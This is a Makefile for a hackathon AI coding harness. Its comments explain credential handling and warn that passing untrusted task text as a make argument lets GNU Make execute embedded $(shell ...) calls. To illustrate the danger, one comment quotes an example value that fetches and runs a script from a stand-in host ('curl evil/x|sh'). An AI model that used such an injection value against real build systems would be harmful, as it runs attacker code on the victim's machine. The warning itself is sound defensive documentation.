# AI Harness Hackathon 2026 — standardized entry points.
#
# make setup   install dependencies
# make test    run the test suite
# make eval    run the fixture evaluation suite (bonus, not required by the spec)
# make clean   remove build artefacts
# make run     launch the harness. Set TASK (or ISSUE) and optionally REPO as
#              real environment variables first for a headless SWE-bench-style
#              run; with neither set, it boots the interactive app instead:
#
#                export TASK="<issue url or text>"; export REPO=<path>; make run
#
#              Do NOT pass these as `make run TASK=...` arguments — see the
#              note below on why that form is unsafe.
#
# The fix is written into REPO in place (evaluators read the working tree);
# set ARGS="--worktree" to leave REPO untouched, ARGS="--thorough" for every
# evidence layer from the start. ARGS is for flags the person invoking `make`
# chooses, never for untrusted content (same caveat as TASK/REPO below).
#
# Credential contract: the evaluator exports AI_API_KEY (and optionally
# AI_BASE_URL / AI_MODEL / AI_PROVIDER) before calling these targets. Nothing
# here or in source reads a hardcoded key — see lib/ai/provider-config.ts and
# lib/ai/credentials.ts, which route AI_API_KEY by its prefix to the matching
# provider adapter. The key is inherited from the environment: never write it
# into a recipe line, because make echoes recipe lines (with variables expanded)
# to the terminal and to CI logs.
#
# Why TASK/REPO/ISSUE are read as $$TASK (a shell variable) and never as
# $(TASK) (make's own macro substitution), and why they must be real
# environment variables rather than `make run TASK=...` arguments: TASK holds
# untrusted content (issue text/URL from whatever supplied it). GNU Make
# recursively re-scans the text of any variable set via a command-line
# `VAR=value` argument for its own `$(...)` syntax — including `$(shell ...)`
# — and does this automatically the moment the variable is exported to a
# recipe, before any of this Makefile's own code runs. A value of
# `$(shell curl evil/x|sh)` passed that way executes on the evaluator's
# machine. A real environment variable (`export TASK=...` in the calling
# shell, or `TASK=... make run`) is never re-scanned this way — make passes
# it through literally — which is why that is the only supported form.
.PHONY: setup run test eval clean

setup:
	@echo "Setting up Viberon..."
	@command -v pnpm >/dev/null 2>&1 || corepack enable
	pnpm install --frozen-lockfile

run:
	@echo "Starting AI Harness (Viberon)..."
	@if [ -z "$$TASK" ] && [ -z "$$ISSUE" ]; then \
		echo "No TASK/ISSUE given -- launching the interactive app on http://localhost:3000."; \
		echo "For a headless SWE-bench-style run instead: export TASK=\"<issue url or text>\" [REPO=<path>], then make run"; \
		pnpm dev; \
	else \
		bin/viberon run --repo "$${REPO:-.}" --task "$${TASK:-$$ISSUE}" --json $(ARGS); \
	fi

test:
	@echo "Running tests..."
	pnpm test

eval:
	@echo "Running fixture evaluation suite..."
	bin/viberon eval $(ARGS)

clean:
	@echo "Removing generated artefacts..."
	rm -rf .next dist tsconfig.tsbuildinfo eval/results
